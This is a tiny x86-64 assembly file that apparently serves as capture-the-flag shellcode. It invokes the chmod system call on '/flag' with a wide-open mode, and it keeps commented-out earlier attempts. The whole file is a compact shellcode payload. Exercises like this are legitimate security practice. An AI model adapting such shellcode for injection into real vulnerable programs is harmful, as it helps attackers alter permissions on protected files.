.global _start
_start:
.intel_syntax noprefix

#mov rdi, [rip + flagText]
#push rdi

mov al, 90
#lea rdi, [rip + flagText]
mov edi, 0x262d400C
mov sil, 0xFF
syscall

flagText:
    .string "/flag"
